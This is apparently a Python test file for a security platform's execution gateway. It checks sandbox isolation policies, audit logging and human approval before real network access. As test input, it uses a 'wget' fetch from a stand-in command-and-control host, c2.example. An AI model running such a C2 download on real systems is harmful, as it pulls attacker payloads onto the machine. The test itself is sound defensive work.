"""runtime 层测试：策略映射、网关四层防线、真实本机执行、审计、detector。

真实执行仅限 host 上无害命令（echo / exit），docker/wsl 交互用 fake backend。
"""

import platform

import pytest

from core.blackboard import Blackboard
from core.runtime import (
    DockerBackend,
    ExecutionGateway,
    GatewayDenied,
    HostDetector,
    NativeBackend,
    allowed_runtimes,
)
from core.runtime.backends import ExecOutcome
from core.runtime.policy import Level, RUNTIME_LEVELS, allowed_levels


# ---------- 策略映射（§7 隔离等级） ----------

def test_policy_threat_class_mapping():
    assert allowed_runtimes("malware_live") == {"sandbox"}
    assert allowed_runtimes("untrusted") == {"docker", "sandbox"}
    assert allowed_runtimes("trusted") == {"host", "wsl", "docker", "sandbox"}
    # 未知 → 按恶意处理（安全默认值）
    assert allowed_runtimes("unknown") == {"sandbox"}
    assert allowed_levels("whatever-else") == {Level.L3_SANDBOX}
    assert RUNTIME_LEVELS["wsl"] == Level.L1_WSL  # WSL 与宿主同级


# ---------- 网关：拒绝路径（第②层防线） ----------

@pytest.fixture()
def bb(tmp_path):
    board = Blackboard(str(tmp_path / "rt.db"))
    yield board
    board.close()


def test_gateway_denies_malware_on_host(bb):
    pid = bb.create_project("t", "reverse")["id"]
    gw = ExecutionGateway(bb=bb)
    with pytest.raises(GatewayDenied, match="策略拒绝"):
        gw.run("echo hi", runtime="host", threat_class="malware_live", project_id=pid)
    # 拒绝必须落审计（audit.deny 事件，§7 第④层）
    deny = [e for e in bb.recent_events(pid) if e["kind"] == "audit.deny"]
    assert len(deny) == 1
    assert deny[0]["payload"]["runtime"] == "host"


def test_gateway_denies_unknown_threat_on_host(bb):
    pid = bb.create_project("t2", "pentest")["id"]
    gw = ExecutionGateway(bb=bb)
    with pytest.raises(GatewayDenied):
        gw.run("echo hi", runtime="host", threat_class="unknown", project_id=pid)


def test_gateway_denies_real_net_without_approval(bb):
    pid = bb.create_project("t3", "reverse")["id"]
    gw = ExecutionGateway(bb=bb)
    with pytest.raises(GatewayDenied, match="net=real 须人工审批"):
        gw.run("wget http://c2.example", runtime="sandbox", threat_class="malware_live",
               project_id=pid, net="real")
    # 有已批准的 approval → 放行（后端 fake，不真跑 docker）
    class FakeSandbox:
        def run_once(self, image, cmd, *, net, sandbox, timeout):
            assert net == "real"
            return ExecOutcome(exit_code=0, stdout="done")
    gw2 = ExecutionGateway(bb=bb, backends={"sandbox": FakeSandbox()})
    approval_id = "appr-1"
    with bb._tx():
        bb.conn.execute(
            "INSERT INTO approvals(id,project_id,session_id,action,risk,status,requested_by,created_at)"
            " VALUES(?,?,?,?,?,?,?,?)",
            (approval_id, pid, None, '{"type":"sandbox_net_real"}', "high", "approved", "session-1",
             "2026-09-12T00:00:00+00:00"),
        )
    r = gw2.run("wget http://c2.example", runtime="sandbox", threat_class="malware_live",
                project_id=pid, net="real", approval_id=approval_id)
    assert r.ok


# ---------- 网关：真实执行（host，无害命令） ----------

@pytest.mark.skipif(platform.system() != "Windows", reason="Windows 路径")
def test_gateway_native_execution_and_audit(bb):
    pid = bb.create_project("t4", "reverse")["id"]
    gw = ExecutionGateway(bb=bb)
    r = gw.run("Write-Output runtime-ok", runtime="host", threat_class="trusted",
               project_id=pid, timeout=30)
    assert r.ok and r.runtime == "host"
    assert "runtime-ok" in r.stdout
    kinds = [e["kind"] for e in bb.recent_events(pid)]
    assert "command" in kinds and "command.result" in kinds
    cmd_ev = [e for e in bb.recent_events(pid) if e["kind"] == "command"][0]
    assert cmd_ev["payload"]["runtime"] == "host"  # 审计带 runtime 标签


def test_gateway_timeout_kills(bb):
    pid = bb.create_project("t5", "ctf")["id"]
    gw = ExecutionGateway(bb=bb)
    r = gw.run("Start-Sleep -Seconds 30", runtime="host", threat_class="trusted",
               project_id=pid, timeout=3)
    assert r.timed_out and not r.ok


# ---------- docker 后端：参数构造（fake subprocess） ----------

def test_sandbox_docker_args(monkeypatch):
    from core.runtime.backends import sandbox_docker_args
    args = sandbox_docker_args("none")
    assert "--rm" in args and args[args.index("--network") + 1] == "none"
    assert "--cap-drop" in args  # 降权
    with pytest.raises(NotImplementedError, match="fakenet"):
        sandbox_docker_args("fakenet")  # 下一里程碑，未实现必须显式失败


def test_docker_run_once_sandbox_invocation(monkeypatch):
    calls = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        class P:
            returncode = 0
            stdout = "ok"
            stderr = ""
        return P()

    monkeypatch.setattr("subprocess.run", fake_run)
    d = DockerBackend()
    d.run_once("anal-image", "id", net="none", sandbox=True)
    argv = calls[0]
    assert argv[0] == "docker" and argv[1] == "run"
    assert "--rm" in argv                      # 一次性
    assert "anal-image" in argv and "sh" in argv
    assert "-c" in argv and "id" in argv
    # 禁止宿主挂载：sandbox 参数里不允许出现 -v/--volume
    assert "-v" not in argv and "--volume" not in argv


# ---------- detector ----------

def test_detector_inventory_prompt(tmp_path, monkeypatch):
    """探测结果 → 能力清单文本（注入系统提示用）。"""
    def fake_probe(cmd, timeout=10.0):
        if cmd[0] == "docker":
            return True, "29.6.1"
        if cmd[0] == "wsl.exe":
            return True, "默认发行版"
        return False, "not found"
    monkeypatch.setattr("core.runtime.detector._run_probe", fake_probe)
    inv = HostDetector().probe()
    text = inv.to_prompt()
    assert "Docker: 可用" in text and "29.6.1" in text
    assert "WSL2: 可用" in text
    assert "工具清单: 暂无注册" in text


def test_detector_tools_manifest_probe(tmp_path, monkeypatch):
    """tools/**/manifest.yaml 的 probe 字段逐一探测（§7 工具目录联动）。"""
    tdir = tmp_path / "tools" / "decompiler" / "ghidra"
    tdir.mkdir(parents=True)
    (tdir / "manifest.yaml").write_text(
        'name: ghidra\nprobe: "where analyzeHeadless"\n', encoding="utf-8")
    calls = []
    def fake_probe(cmd, timeout=10.0):
        calls.append(cmd)
        return False, "not found"
    monkeypatch.setattr("core.runtime.detector._run_probe", fake_probe)
    inv = HostDetector().probe(tools_root=tmp_path / "tools")
    assert [c for c in calls if "analyzeHeadless" in " ".join(c)]
    assert inv.tools[0].name == "ghidra" and not inv.tools[0].available
    # 缺失工具出现在提示中，引导安装
    assert "ghidra" in inv.to_prompt()
